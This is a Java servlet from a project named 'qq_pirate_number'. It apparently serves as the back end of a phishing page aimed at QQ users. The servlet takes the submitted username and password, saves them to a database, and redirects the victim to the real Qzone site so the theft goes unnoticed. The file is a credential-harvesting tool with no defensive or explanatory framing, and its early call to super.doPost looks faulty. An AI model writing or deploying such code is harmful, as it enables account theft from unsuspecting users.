package com.xingyu.qq_pirate_number.servlet;
import com.xingyu.qq_pirate_number.umis.dao.IUserDAO;
import com.xingyu.qq_pirate_number.umis.dao.impl.UserDAOImpl;
import com.xingyu.qq_pirate_number.umis.domain.User;
import org.apache.commons.lang3.StringUtils;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/number", name = "NumberServlet")
public class NumberServlet extends HttpServlet {
    private IUserDAO iUserDAO = new UserDAOImpl();

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);

        req.setCharacterEncoding("utf-8");
        String username = req.getParameter("username");
        String password = req.getParameter("password");
        if (!StringUtils.isAnyBlank(username, password)) {
            User user = new User();
            user.setLogin_id(username);
            user.setPassword(password);
            iUserDAO.save(user);
        }
        resp.sendRedirect("https://qzone.qq.com/");
    }
}
